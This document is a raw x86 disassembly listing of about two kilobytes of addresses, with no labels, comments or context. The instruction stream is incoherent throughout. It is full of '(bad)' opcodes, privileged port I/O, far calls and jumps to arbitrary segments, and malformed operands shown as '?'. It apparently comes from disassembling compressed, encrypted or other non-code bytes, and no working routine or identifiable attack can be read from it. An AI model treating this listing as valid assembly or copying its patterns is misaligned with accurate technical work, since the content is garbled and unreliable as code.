  4028c1:	popa   
  4028c2:	mov    ds:0xeb71f4cf,al
  4028c7:	imul   ebp,DWORD PTR [ebp-0x638730f0],0xa
  4028ce:	or     bh,BYTE PTR [eax-0x48]
  4028d1:	dec    eax
  4028d2:	int    0x8a
  4028d4:	mov    edi,0x40653923
  4028d9:	shl    eax,cl
  4028db:	test   esi,esi
  4028dd:	and    al,0x5a
  4028df:	pop    esp
  4028e0:	lds    edi,FWORD PTR [edx-0x5c156449]
  4028e6:	(bad)  
  4028e7:	pushf  
  4028e8:	fwait
  4028e9:	(bad)  
  4028ea:	sbb    BYTE PTR [edx+0x4b],dl
  4028ed:	ins    BYTE PTR es:[edi],dx
  4028ee:	mov    fs,WORD PTR [eax-0x70]
  4028f1:	xchg   edx,eax
  4028f2:	inc    ebp
  4028f3:	popf   
  4028f4:	(bad)  
  4028f5:	pop    esi
  4028f6:	in     al,0xf
  4028f8:	das    
  4028f9:	mov    edi,0x93f05c85
  4028fe:	adc    ah,BYTE PTR [edi]
  402900:	mov    dh,0x4c
  402902:	sti    
  402903:	mov    ebp,0xc806a9d9
  402908:	mov    ch,0xb0
  40290a:	cmp    eax,0x98b81f0e
  40290f:	retf   
  402910:	lock imul ebx,eax,0xdfaa3221
  402917:	rcl    DWORD PTR [ecx-0x4c4500e2],cl
  40291d:	sar    ax,cl
  402920:	fst    st(6)
  402922:	(bad)  
  402923:	aas    
  402924:	adc    al,BYTE PTR [ebp+0x34]
  402927:	jl     0x402922
  402929:	dec    ebp
  40292a:	lock xchg edx,edi
  40292d:	lahf   
  40292e:	ret    0xffe5
  402931:	aas    
  402932:	retf   0xb2a
  402935:	pop    esi
  402936:	sbb    ecx,DWORD PTR [eax+0x280a17a9]
  40293c:	add    BYTE PTR [ebx-0x26a7b8a7],dh
  402942:	mov    bl,0xe0
  402944:	mov    cl,0x4
  402946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402947:	inc    esp
  402948:	jp     0x40299f
  40294a:	call   0x66ef:0xab298006
  402951:	enter  0x5504,0xd5
  402955:	mov    ch,0x27
  402957:	js     0x40299a
  402959:	test   DWORD PTR [eax+0x59a068d1],0x5751ae95
  402963:	mov    eax,ds:0xc65618b6
  402968:	mov    esi,0xd06e2c1f
  40296d:	sub    DWORD PTR [ebx-0xaeb4670],0xd33b345
  402977:	xor    esi,esp
  402979:	or     al,0x91
  40297b:	faddp  st(5),st
  40297d:	pop    ecx
  40297e:	and    bh,BYTE PTR [ebx-0x523af59a]
  402984:	test   esp,ebp
  402986:	dec    ecx
  402987:	jb     0x40299f
  402989:	dec    edi
  40298a:	inc    esp
  40298b:	outs   dx,DWORD PTR ds:[esi]
  40298c:	adc    ah,BYTE PTR [edx-0x17]
  40298f:	xchg   edi,eax
  402990:	pushf  
  402991:	pushf  
  402992:	outs   dx,DWORD PTR ds:[esi]
  402993:	cli    
  402994:	in     al,0x5
  402996:	stos   DWORD PTR es:[edi],eax
  402997:	out    0xf3,al
  402999:	cwde   
  40299a:	lods   al,BYTE PTR ds:[esi]
  40299b:	icebp  
  40299c:	fistp  QWORD PTR [edi+eiz*2+0x76f5663e]
  4029a3:	push   esi
  4029a4:	mov    WORD PTR [edi+0x76],ds
  4029a7:	test   ah,bl
  4029a9:	js     0x4029fe
  4029ab:	and    eax,0x817b9c0d
  4029b0:	pop    ecx
  4029b1:	fsubr  QWORD PTR [edi]
  4029b3:	fcomp  QWORD PTR [esi+ebp*2+0x4c18d8a9]
  4029ba:	shl    dl,cl
  4029bc:	ins    BYTE PTR es:[edi],dx
  4029bd:	clc    
  4029be:	push   es
  4029bf:	aaa    
  4029c0:	jmp    0xbf56fc2
  4029c5:	(bad)  
  4029c6:	pop    ds
  4029c7:	outs   dx,DWORD PTR ds:[esi]
  4029c8:	xor    eax,0xd20111d9
  4029cd:	sbb    dl,ah
  4029cf:	jno    0x402984
  4029d1:	test   eax,edi
  4029d3:	inc    edi
  4029d4:	push   DWORD PTR [ebx+ebx*2+0x4f]
  4029d8:	mov    eax,0xb16f0709
  4029dd:	inc    ebx
  4029de:	sbb    eax,0x7580e813
  4029e3:	test   DWORD PTR [esi+0x51],edi
  4029e6:	fs out dx,al
  4029e8:	(bad)  
  4029e9:	(bad)  
  4029ea:	popf   
  4029eb:	imul   ebp,DWORD PTR [ebp-0x4a],0xffffffe2
  4029ef:	jns    0x4029e1
  4029f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029f2:	cmp    cl,BYTE PTR ds:0x6e3dedc7
  4029f8:	jae    0x402a0a
  4029fa:	xchg   edx,eax
  4029fb:	xor    eax,0x9b8a0ba
  402a00:	mov    ecx,DWORD PTR [edi]
  402a02:	mov    esi,0x89e9b2cb
  402a07:	out    dx,eax
  402a08:	push   ss
  402a09:	dec    esp
  402a0a:	mov    BYTE PTR [ecx+0x56],bl
  402a0d:	mov    eax,ds:0xfdf9a13f
  402a12:	or     DWORD PTR [edx],0x66e6495f
  402a18:	dec    edi
  402a19:	stos   BYTE PTR es:[edi],al
  402a1a:	stos   BYTE PTR es:[edi],al
  402a1b:	mov    al,ds:0xd57caaa3
  402a20:	loope  0x4029a5
  402a22:	clc    
  402a23:	ja     0x402a49
  402a25:	push   0xffffffe5
  402a27:	and    ch,cl
  402a29:	mov    eax,ds:0x53f2729c
  402a2e:	and    edx,DWORD PTR [eax+edx*2-0x28]
  402a32:	nop
  402a33:	mov    esi,0xb2f21aff
  402a38:	cwde   
  402a39:	pusha  
  402a3a:	jb     0x402a61
  402a3c:	pop    edx
  402a3d:	data16 into 
  402a3f:	fwait
  402a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a41:	dec    DWORD PTR [edx-0x6b3ea21d]
  402a47:	retf   
  402a48:	cdq    
  402a49:	sbb    DWORD PTR [ebx],edx
  402a4b:	jl     0x402ac6
  402a4d:	adc    dl,bh
  402a4f:	push   0x1d977bb6
  402a54:	add    DWORD PTR [edx+ebp*4],ebp
  402a57:	add    al,0x28
  402a59:	mov    ebx,0x2e504b99
  402a5e:	test   BYTE PTR [ebp-0x19],ch
  402a61:	test   al,0x80
  402a63:	ds (bad) 
  402a65:	ja     0x402ac3
  402a67:	inc    esi
  402a68:	mov    DWORD PTR [ecx-0x7c0c6275],eax
  402a6e:	sbb    dl,BYTE PTR [eax]
  402a70:	jecxz  0x402a17
  402a72:	lods   al,BYTE PTR ds:[esi]
  402a73:	mov    esp,0x5f7f70c6
  402a78:	aad    0xe0
  402a7a:	sar    DWORD PTR [ecx+0x4201957c],cl
  402a80:	xor    eax,0xa687952f
  402a85:	pop    edi
  402a86:	aam    0x30
  402a88:	retf   0x1385
  402a8b:	push   ecx
  402a8c:	pop    esi
  402a8d:	or     dl,BYTE PTR [edi+0xd]
  402a90:	cmp    al,0x67
  402a92:	arpl   WORD PTR [esi+0xc],di
  402a95:	mov    ebp,0xf3c36eb3
  402a9a:	fmul   QWORD PTR ds:0x162da82f
  402aa0:	cwde   
  402aa1:	sub    BYTE PTR [edx],0x84
  402aa4:	xchg   BYTE PTR [ecx+0x47f282f4],cl
  402aaa:	popf   
  402aab:	or     DWORD PTR [eax],ebp
  402aad:	inc    ecx
  402aae:	into   
  402aaf:	push   edi
  402ab0:	xor    DWORD PTR [ebp+0x4da2b597],edx
  402ab6:	cmp    ah,BYTE PTR [ecx+esi*2]
  402ab9:	cmp    BYTE PTR [edx],dh
  402abb:	ds das 
  402abd:	pop    ebp
  402abe:	mov    ch,0xe8
  402ac0:	fs push 0x4a
  402ac3:	mov    ch,0x56
  402ac5:	dec    edx
  402ac6:	xchg   edi,eax
  402ac7:	xchg   esi,eax
  402ac8:	and    BYTE PTR [edx],al
  402aca:	aad    0xdc
  402acc:	out    dx,eax
  402acd:	xor    DWORD PTR [ecx+edi*1-0x7cc52e28],edx
  402ad4:	dec    edi
  402ad5:	outs   dx,DWORD PTR ds:[esi]
  402ad6:	(bad)  
  402ad7:	mov    ebp,0xef880956
  402adc:	adc    BYTE PTR [edi],cl
  402ade:	out    dx,al
  402adf:	xchg   esp,eax
  402ae0:	sbb    BYTE PTR [ecx],dh
  402ae2:	ret    0xe6ee
  402ae5:	pushf  
  402ae6:	out    0x34,al
  402ae8:	pop    ebx
  402ae9:	jp     0x402ab3
  402aeb:	cli    
  402aec:	aad    0xcc
  402aee:	shl    edx,cl
  402af0:	call   0x4fdc:0xbbf68e8e
  402af7:	popa   
  402af8:	push   cs
  402af9:	mov    dh,0x46
  402afb:	sub    eax,0x5d123b0f
  402b00:	mov    esi,0x53d1de5c
  402b05:	pop    ebp
  402b06:	cdq    
  402b07:	xor    eax,edx
  402b09:	mov    ds:0x81a31c3e,eax
  402b0e:	into   
  402b0f:	adc    dh,BYTE PTR [eax-0x71abbf7f]
  402b15:	fiadd  WORD PTR [ebx-0x5c]
  402b18:	(bad)  
  402b19:	aad    0xab
  402b1b:	scas   al,BYTE PTR es:[edi]
  402b1c:	cmp    DWORD PTR [edi],ebx
  402b1e:	loopne 0x402b6f
  402b20:	sahf   
  402b21:	mov    dl,BYTE PTR [edi-0x15fa3111]
  402b27:	gs pop eax
  402b29:	push   0x732b6080
  402b2e:	fwait
  402b2f:	mov    bl,0x79
  402b31:	xchg   edi,eax
  402b32:	pop    edx
  402b33:	gs retf 0xd329
  402b37:	(bad)
  402b3a:	sbb    dl,bh
  402b3c:	jae    0x402aeb
  402b3e:	or     bh,dh
  402b40:	jmp    0x41ab611
  402b45:	data16 xor BYTE PTR ds:0x2f11d206,cl
  402b4c:	mov    ds:0xad27c68a,eax
  402b51:	mov    ebp,ebp
  402b53:	dec    esi
  402b54:	adc    cl,BYTE PTR [edi-0x2e90b1d1]
  402b5a:	pushf  
  402b5b:	mov    bl,0x51
  402b5d:	dec    esi
  402b5e:	sub    al,0x57
  402b60:	cli    
  402b61:	mov    cl,0x2a
  402b63:	and    al,0xfc
  402b66:	popf   
  402b67:	xchg   edi,eax
  402b68:	cmp    ebp,esi
  402b6a:	sub    eax,0xc61ed146
  402b6f:	dec    edi
  402b70:	add    eax,DWORD PTR [edi+0x15]
  402b73:	out    0xf2,al
  402b75:	and    DWORD PTR [ecx-0x6334553],0xc1e40f06
  402b7f:	push   eax
  402b80:	jb     0x402bcc
  402b82:	and    eax,0xe91881ea
  402b87:	xor    BYTE PTR [ebx-0x6c],0xe5
  402b8b:	popf   
  402b8c:	dec    ebp
  402b8d:	iret   
  402b8e:	mov    eax,0xfd48ebbc
  402b93:	and    ebx,DWORD PTR [eax]
  402b95:	mov    ch,BYTE PTR [ecx-0x76c8fc9]
  402b9b:	addr16 mov ebx,0x235d9ab
  402ba1:	mov    BYTE PTR [edi+0x5b],cl
  402ba4:	mov    ebx,0x73e5442a
  402ba9:	int    0x3f
  402bab:	scas   al,BYTE PTR es:[edi]
  402bac:	out    dx,al
  402bad:	inc    ecx
  402bae:	mov    ebx,0x645aa828
  402bb3:	xchg   edx,eax
  402bb4:	shl    BYTE PTR fs:[esi-0xb],0x7d
  402bb9:	and    eax,DWORD PTR [edx]
  402bbb:	addr16 ss in eax,dx
  402bbe:	inc    ecx
  402bbf:	(bad)  [edi+eax*1]
  402bc2:	rcl    al,1
  402bc4:	mov    esp,0x9dffa6f1
  402bc9:	xchg   esp,eax
  402bca:	add    cl,BYTE PTR ds:[esi-0xa]
  402bce:	inc    edi
  402bcf:	shl    DWORD PTR [ebx-0x64],cl
  402bd2:	shl    BYTE PTR [esi-0x39],1
  402bd5:	sub    eax,0xd2ac9ff
  402bda:	jg     0x402b71
  402bdc:	lods   al,BYTE PTR ds:[esi]
  402bdd:	stos   DWORD PTR es:[edi],eax
  402bde:	xchg   DWORD PTR [edx+0x33],eax
  402be1:	pop    ebp
  402be2:	cmp    bh,ah
  402be4:	mov    bl,0xf9
  402be6:	fild   DWORD PTR [edx]
  402be8:	inc    esp
  402be9:	aaa    
  402bea:	mov    dl,0xfb
  402bec:	ficomp WORD PTR [edx+edi*8]
  402bef:	addr16 daa 
  402bf1:	push   esi
  402bf2:	stc    
  402bf3:	in     al,0x2d
  402bf5:	repnz lods eax,DWORD PTR ds:[esi]
  402bf7:	test   eax,0x1777d2ec
  402bfc:	cwde   
  402bfd:	gs repnz push eax
  402c00:	mov    ebx,0xd50b080b
  402c05:	and    ebp,DWORD PTR [ecx-0x57ff6b61]
  402c0b:	ds and eax,0x381268da
  402c11:	mov    esp,0xbaf3ec7d
  402c16:	retf   
  402c17:	cmp    al,BYTE PTR [esi+eiz*1+0x51]
  402c1b:	mov    ecx,DWORD PTR [edx-0x7f53fd00]
  402c21:	or     ah,BYTE PTR [ebx+0x3f]
  402c24:	add    BYTE PTR [ebx+0x54],cl
  402c27:	in     eax,0xb
  402c29:	hlt    
  402c2a:	jae    0x402bf7
  402c2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c2d:	(bad)  
  402c2e:	fldcw  WORD PTR [esi-0x5]
  402c31:	dec    ecx
  402c32:	sbb    BYTE PTR [ebx+0x9],al
  402c35:	xchg   ecx,eax
  402c36:	cwde   
  402c37:	cmp    eax,0x34a39291
  402c3c:	xchg   ebp,eax
  402c3d:	xchg   ebx,eax
  402c3e:	call   0xbfbf:0x2a366f55
  402c45:	shl    DWORD PTR [ecx-0x7d0153c4],cl
  402c4b:	and    cl,dl
  402c4d:	(bad)  
  402c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c50:	add    al,0xb0
  402c52:	mov    dh,0x15
  402c54:	fimul  DWORD PTR [eax-0x2a]
  402c57:	gs jnp 0x402c03
  402c5a:	xor    BYTE PTR [esi],ah
  402c5c:	retf   0x56f8
  402c5f:	and    eax,0xbe5cf8fe
  402c64:	inc    edx
  402c65:	ins    BYTE PTR es:[edi],dx
  402c66:	jmp    0x402c15
  402c68:	out    0xe3,eax
  402c6a:	adc    dh,BYTE PTR [ebx+0xfd8938f]
  402c70:	outs   dx,DWORD PTR ds:[esi]
  402c71:	dec    eax
  402c72:	mov    ds:0xcb75c64a,al
  402c77:	sub    bl,ah
  402c79:	in     eax,0xfa
  402c7b:	(bad)  [edx]
  402c7d:	dec    ebp
  402c7e:	adc    DWORD PTR [ebp+0x3f084fd0],edi
  402c84:	rcr    ebx,cl
  402c86:	out    0x9b,eax
  402c88:	ja     0x402c73
  402c8a:	or     BYTE PTR [ebx+0x12d4d88e],ah
  402c90:	and    DWORD PTR [ecx],edi
  402c92:	lods   eax,DWORD PTR ds:[esi]
  402c93:	call   DWORD PTR [edi+ecx*8-0x80]
  402c97:	inc    ecx
  402c98:	(bad)  
  402c99:	ss xchg edi,eax
  402c9b:	push   ss
  402c9c:	add    eax,0x436bbc01
  402ca1:	sbb    cl,BYTE PTR [ebx-0x2b]
  402ca4:	cmovg  edi,DWORD PTR [ecx]
  402ca7:	fisubr WORD PTR gs:[edi]
  402caa:	adc    al,0xd8
  402cac:	shl    BYTE PTR [ebx+0x487abaa2],0x63
  402cb3:	scas   eax,DWORD PTR es:[edi]
  402cb4:	xchg   esi,eax
  402cb5:	dec    esi
  402cb6:	inc    edi
  402cb7:	push   ss
  402cb8:	jmp    0x2cacb257
  402cbd:	pop    ecx
  402cbe:	in     al,0xd6
  402cc0:	das    
  402cc1:	out    0xb3,al
  402cc3:	mov    ah,0xb
  402cc5:	sbb    bl,bl
  402cc7:	mov    ds,WORD PTR [ebp+0x27e12063]
  402ccd:	add    ah,BYTE PTR [edx-0x31527b1]
  402cd3:	lods   eax,DWORD PTR ds:[esi]
  402cd4:	(bad)  
  402cd5:	mov    eax,ds:0xf837236c
  402cda:	setne  BYTE PTR [ebp-0x3c555808]
  402ce1:	lea    ecx,[esi+0x1a]
  402ce4:	pop    edi
  402ce5:	iret   
  402ce6:	rcl    DWORD PTR [esi],1
  402ce8:	loopne 0x402cc2
  402cea:	jmp    0x60f3562a
  402cef:	les    esp,FWORD PTR [eax+0x327c9fde]
  402cf5:	bound  ebx,QWORD PTR [eax]
  402cf7:	pop    ds
  402cf8:	inc    edx
  402cf9:	(bad)  
  402cfa:	imul   esi,DWORD PTR [edx],0x12
  402cfd:	mov    esi,0xa0269c29
  402d02:	dec    esp
  402d03:	enter  0x1999,0xb
  402d07:	cdq    
  402d08:	cmp    eax,0xb5c66c23
  402d0d:	push   ecx
  402d0e:	lea    esp,[edx-0x49868f39]
  402d14:	xchg   esp,eax
  402d15:	adc    eax,0xb2a671f6
  402d1a:	repnz push esi
  402d1c:	pushf  
  402d1d:	aaa    
  402d1e:	mov    dl,0xf9
  402d20:	mov    eax,0xfc0cb147
  402d25:	or     DWORD PTR [esp+edx*8-0x7a],esp
  402d29:	int3   
  402d2a:	jg     0x402d07
  402d2c:	xlat   BYTE PTR ds:[ebx]
  402d2d:	nop
  402d2e:	cs push esi
  402d30:	pop    esp
  402d31:	enter  0xbeae,0x4a
  402d35:	fidiv  DWORD PTR ds:0x888ca0c6
  402d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d3c:	idiv   BYTE PTR [edi+0x15659657]
  402d42:	aas    
  402d43:	sbb    DWORD PTR [edx],ecx
  402d45:	push   ds
  402d46:	xor    BYTE PTR [ebp+0x76cb66b1],dl
  402d4c:	fdiv   QWORD PTR [ebx+0x34329bb3]
  402d52:	cld    
  402d53:	call   0x64de1e4f
  402d58:	adc    cl,BYTE PTR ds:0x605522b8
  402d5e:	adc    eax,0x913ac6aa
  402d63:	or     dl,BYTE PTR [ecx+eiz*8-0x41]
  402d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d68:	out    dx,al
  402d69:	stc    
  402d6a:	xchg   esi,eax
  402d6b:	sbb    eax,DWORD PTR [ebp+0x3dd52a17]
  402d71:	neg    BYTE PTR [edx+0x62b3fa68]
  402d77:	jne    0x402d68
  402d79:	mov    BYTE PTR [eax+edx*4+0x13bd840f],bh
  402d80:	stc    
  402d81:	inc    ebp
  402d82:	ret    
  402d83:	push   ds
  402d84:	outs   dx,BYTE PTR ds:[esi]
  402d85:	jg     0x402d95
  402d87:	pop    ecx
  402d88:	lods   eax,DWORD PTR ds:[esi]
  402d89:	aam    0xb3
  402d8b:	inc    eax
  402d8c:	loop   0x402ddb
  402d8e:	ret    
  402d8f:	cdq    
  402d90:	gs sbb dl,ah
  402d93:	cmp    BYTE PTR [esi+0x365d7d80],al
  402d99:	push   ds
  402d9a:	lahf   
  402d9b:	sub    al,0x12
  402d9d:	test   DWORD PTR [edi+ebx*8+0x7527ecfe],edx
  402da4:	ret    0xba1c
  402da7:	mov    ch,0xd8
  402da9:	jo     0x402e25
  402dab:	test   BYTE PTR [edi-0x5a3267af],ch
  402db1:	xchg   edi,eax
  402db2:	leave  
  402db3:	aad    0x6b
  402db5:	dec    ebx
  402db6:	(bad)  
  402db7:	jns    0x402df7
  402db9:	xchg   ebx,eax
  402dba:	push   cs
  402dbb:	fidiv  WORD PTR [edx]
  402dbd:	test   al,dh
  402dbf:	dec    ebx
  402dc0:	xor    eax,DWORD PTR [edi-0x5863b8f4]
  402dc6:	and    esi,DWORD PTR [eax]
  402dc8:	popa   
  402dc9:	stos   DWORD PTR es:[edi],eax
  402dca:	mov    esp,ebx
  402dcc:	inc    edi
  402dcd:	loopne 0x402d85
  402dcf:	xor    eax,0x70bb624e
  402dd4:	pop    esp
  402dd5:	pop    es
  402dd6:	les    edi,FWORD PTR [ebp-0x79]
  402dd9:	mov    BYTE PTR [esi+0x39],dh
  402ddc:	mov    edx,0xa513a09e
  402de1:	retf   0x22c4
  402de4:	outs   dx,BYTE PTR ds:[esi]
  402de5:	call   0x53cf38f3
  402dea:	jae    0x402d9b
  402dec:	fwait
  402ded:	das    
  402dee:	mov    edi,0x6bef9190
  402df3:	bound  esi,QWORD PTR [ecx+0x2234f2ad]
  402df9:	mov    fs,WORD PTR [ebx]
  402dfb:	call   0xffa38b7e
  402e00:	clc    
  402e01:	sbb    DWORD PTR es:[ecx+0x5e],ebp
  402e05:	mov    ebp,ecx
  402e07:	jmp    0x9cee:0x17ff9b14
  402e0e:	xor    al,0xf
  402e10:	and    al,0xa6
  402e12:	add    eax,0xd8d4662b
  402e17:	nop
  402e18:	jae    0x402de9
  402e1a:	loopne 0x402dc3
  402e1c:	mov    ?,ebp
  402e1e:	aas    
  402e1f:	sahf   
  402e20:	xchg   esi,eax
  402e21:	push   0x9b43e2f9
  402e26:	sbb    al,0x98
  402e28:	xchg   ecx,eax
  402e29:	sbb    eax,0x3518a7ad
  402e2e:	jge    0x402ea4
  402e30:	(bad)  
  402e31:	pop    eax
  402e32:	test   eax,0x58a4b786
  402e37:	shl    DWORD PTR [edi-0x5a73cda8],1
  402e3d:	push   ebx
  402e3e:	inc    ecx
  402e3f:	hlt    
  402e40:	jns    0x402dc6
  402e42:	add    cl,ch
  402e44:	hlt    
  402e45:	(bad)  
  402e46:	mov    dh,0xec
  402e48:	jle    0x402e8c
  402e4a:	mov    dl,0x9d
  402e4c:	or     DWORD PTR [edx-0x49e97bd9],edi
  402e52:	(bad)  
  402e53:	rol    BYTE PTR [edi+0x42],cl
  402e56:	das    
  402e57:	cdq    
  402e58:	shr    esi,0x39
  402e5b:	push   edi
  402e5c:	xor    BYTE PTR [ebx-0x2],cl
  402e5f:	push   ebp
  402e60:	ds test eax,0x93ebe944
  402e66:	push   ds
  402e67:	(bad)  
  402e68:	out    dx,eax
  402e69:	fdivr  QWORD PTR [eax+0x11]
  402e6c:	cmp    BYTE PTR [eax+ebp*8-0x71a765ad],al
  402e73:	popf   
  402e74:	sbb    al,BYTE PTR [esi+0x3c]
  402e77:	fimul  WORD PTR [eax+0x5041dc94]
  402e7d:	sbb    BYTE PTR [esi-0x4],al
  402e80:	sub    ebx,edx
  402e82:	mov    eax,eax
  402e84:	xchg   ecx,eax
  402e85:	jo     0x402ef9
  402e87:	sub    al,cl
  402e89:	mov    esp,0xaeb66177
  402e8e:	push   es
  402e8f:	jge    0x402eff
  402e91:	jbe    0x402e34
  402e93:	dec    edx
  402e94:	popf   
  402e95:	pop    eax
  402e96:	mov    al,ds:0xd3a4723e
  402e9b:	jg     0x402ece
  402e9d:	cdq    
  402e9e:	mov    ds:0x50f4470d,eax
  402ea3:	rol    DWORD PTR cs:[edi-0x6a358be1],cl
  402eaa:	mov    esi,DWORD PTR [ecx]
  402eac:	ins    BYTE PTR es:[edi],dx
  402ead:	jo     0x402f2b
  402eaf:	lods   eax,DWORD PTR ds:[esi]
  402eb0:	inc    ebx
  402eb1:	ins    DWORD PTR es:[edi],dx
  402eb2:	mov    bl,0xfe
  402eb4:	outs   dx,BYTE PTR ds:[esi]
  402eb5:	(bad)  
  402eb6:	xlat   BYTE PTR ds:[ebx]
  402eb7:	jecxz  0x402f29
  402eb9:	popf   
  402eba:	lock and BYTE PTR [ecx+0x2afbd01d],al
  402ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ec2:	xchg   ecx,eax
  402ec3:	add    cl,dl
  402ec5:	loop   0x402f02
  402ec7:	mov    esp,0x9efcee17
  402ecc:	sbb    BYTE PTR [ecx*2-0x43b5cd5d],al
  402ed3:	fs pop ecx
  402ed5:	pop    edi
  402ed6:	mov    esp,0xdfb30238
  402edb:	(bad)  
  402edc:	pop    ebx
  402edd:	jae    0x402efc
  402edf:	jmp    0x402e71
  402ee1:	jbe    0x402e93
  402ee3:	mov    dh,0x22
  402ee5:	fs push ss
  402ee7:	inc    edi
  402ee8:	outs   dx,DWORD PTR ds:[esi]
  402ee9:	add    al,0xfc
  402eeb:	pop    esi
  402eec:	or     DWORD PTR [ebp-0xfb14c34],0xc10c92ed
  402ef6:	xchg   esp,eax
  402ef7:	data16 int 0xf6
  402efa:	jne    0x402ee9
  402efc:	and    al,BYTE PTR [ebp-0x42]
  402eff:	push   esi
  402f00:	sbb    dl,BYTE PTR ds:0xd0691e78
  402f06:	mov    dh,0xdc
  402f08:	stos   BYTE PTR es:[edi],al
  402f09:	mov    edi,0xfa092b08
  402f0e:	(bad)  
  402f0f:	jg     0x402ec7
  402f11:	mov    dl,0x46
  402f13:	push   ecx
  402f14:	jno    0x402f91
  402f16:	jbe    0x402f2a
  402f18:	mov    al,0x26
  402f1a:	mov    al,0x21
  402f1c:	sti    
  402f1d:	sub    edi,edi
  402f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f20:	xchg   DWORD PTR [ebp-0x3bcb5398],esi
  402f26:	lods   eax,DWORD PTR ds:[esi]
  402f27:	mov    bl,BYTE PTR [esi+0x2d291e85]
  402f2d:	stc    
  402f2e:	add    DWORD PTR [edi+ecx*2+0x27e011ed],ebx
  402f35:	pop    es
  402f36:	fistp  WORD PTR [ebp-0x45337bfb]
  402f3c:	sbb    al,0x2e
  402f3e:	test   eax,0x8b7c87de
  402f43:	les    ebp,FWORD PTR [edx*8+0x77225cea]
  402f4a:	mov    al,0xf9
  402f4c:	cmp    dh,BYTE PTR [edx]
  402f4e:	or     esi,ebx
  402f50:	jns    0x402efe
  402f52:	(bad)  
  402f53:	mov    esp,0x44313f95
  402f58:	imul   edi,DWORD PTR [esi+0x67],0x51
  402f5c:	lods   al,BYTE PTR ds:[esi]
  402f5d:	outs   dx,DWORD PTR ds:[esi]
  402f5e:	and    BYTE PTR [ebp-0x17],0x7
  402f62:	or     edx,DWORD PTR [ebx+0x53]
  402f65:	jne    0x402fa4
  402f67:	outs   dx,BYTE PTR ds:[esi]
  402f69:	lods   al,BYTE PTR ds:[esi]
  402f6a:	sbb    eax,0x3af23052
  402f6f:	pop    eax
  402f70:	xor    ebx,DWORD PTR [edi+0x25]
  402f73:	mov    bh,0x42
  402f75:	lea    ebx,[ebp-0x1264e350]
  402f7b:	xor    dh,BYTE PTR ds:0x8222f90f
  402f81:	aad    0x46
  402f83:	aam    0x8
  402f85:	inc    ecx
  402f86:	pusha  
  402f87:	cdq    
  402f88:	cld    
  402f89:	in     eax,dx
  402f8a:	std    
  402f8b:	mov    cl,0xb8
  402f8d:	lds    eax,FWORD PTR [eax]
  402f8f:	int3   
  402f90:	pop    ss
  402f91:	lock sub BYTE PTR [ecx+ecx*1+0x44],cl
  402f96:	test   eax,0x22cc14e7
  402f9b:	cwde   
  402f9c:	xchg   BYTE PTR [ebx-0x63a7574a],ah
  402fa2:	(bad)  
  402fa3:	ins    DWORD PTR es:[edi],dx
  402fa4:	pop    ebp
  402fa5:	dec    edi
  402fa6:	mov    bl,0xe4
  402fa8:	and    DWORD PTR [ebp+esi*2-0x6a],0xffffffa2
  402fad:	rcr    BYTE PTR [ecx+0x17],1
  402fb0:	mov    ecx,DWORD PTR [edi-0x54]
  402fb3:	mov    bh,0xd1
  402fb5:	add    ecx,DWORD PTR [ecx]
  402fb7:	push   0x79de478d
  402fbc:	fstp   QWORD PTR [edx+0x3b]
  402fbf:	adc    eax,0x4f0495c7
  402fc4:	and    eax,0xed0f678
  402fc9:	fs sbb eax,0x41282b3f
  402fcf:	(bad)  
  402fd0:	adc    eax,DWORD PTR [esi+0x4524fcd6]
  402fd6:	push   0x68c774d8
  402fdb:	(bad)  
  402fdc:	jge    0x40302d
  402fde:	inc    ebx
  402fdf:	mov    ?,WORD PTR [esi+0x1e]
  402fe2:	pusha  
  402fe3:	bound  ecx,QWORD PTR [ecx]
  402fe5:	out    0x30,al
  402fe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fe8:	mov    ds:0xf44492a3,eax
  402fed:	adc    ebx,edx
  402fef:	sub    al,0x76
  402ff1:	stos   BYTE PTR es:[edi],al
  402ff2:	cmp    DWORD PTR [edi],edi
  402ff4:	(bad)  
  402ff5:	and    edi,DWORD PTR [ebp+0x76]
  402ff8:	test   al,0x8f
  402ffa:	push   ds
  402ffb:	mov    eax,es
  402ffd:	dec    ebx
  402ffe:	push   eax
  402fff:	jo     0x403036
  403001:	mov    ecx,0x35f6809e
  403006:	fimul  DWORD PTR [edi+ebp*8-0x55]
  40300a:	mov    ah,0x41
  40300c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40300d:	mov    BYTE PTR [ecx+0x29eacd5d],bl
  403013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403014:	cmp    DWORD PTR [ecx+0x53],ebx
  403017:	int3   
  403018:	inc    edx
  403019:	enter  0xbbe8,0x95
  40301d:	test   dl,bl
  40301f:	inc    ecx
  403020:	dec    edi
  403021:	jnp    0x403058
  403023:	ret    0x79c7
  403026:	inc    ebp
  403027:	pusha  
  403028:	pop    ebp
  403029:	ss mov edi,0xa8cf0c76
  40302f:	cmp    edx,DWORD PTR [edi-0x59e0bffa]
  403035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403036:	xchg   ecx,eax
  403037:	xor    esp,DWORD PTR [bp-0x32]
  40303b:	xchg   ebp,eax
  40303c:	outs   dx,DWORD PTR ds:[esi]
  40303d:	adc    ebp,DWORD PTR [ebx]
  40303f:	aas    
  403040:	std    
  403041:	shl    BYTE PTR [ecx+eax*1-0x7f40f03f],1
  403048:	push   ecx
  403049:	adc    cl,BYTE PTR [edi+0x7adef3b0]
  40304f:	push   DWORD PTR [ebx-0x7f]
  403052:	inc    edx
  403053:	addr16 jo 0x402ff1
  403056:	adc    ch,bh
  403058:	jecxz  0x403023
  40305a:	es ins DWORD PTR es:[edi],dx
  40305c:	std    
  40305d:	nop
  40305e:	inc    esi
  40305f:	lahf   
  403060:	fsub   DWORD PTR [eax]
  403062:	xor    eax,0xd15e3bc1
  403067:	(bad)  
  403068:	jl     0xdc2a28aa
  40306e:	inc    edi
  40306f:	faddp  st(1),st
  403071:	pushf  
  403072:	mov    ebx,DWORD PTR [ebp+0x1c3c6f9f]
  403078:	ins    DWORD PTR es:[edi],dx
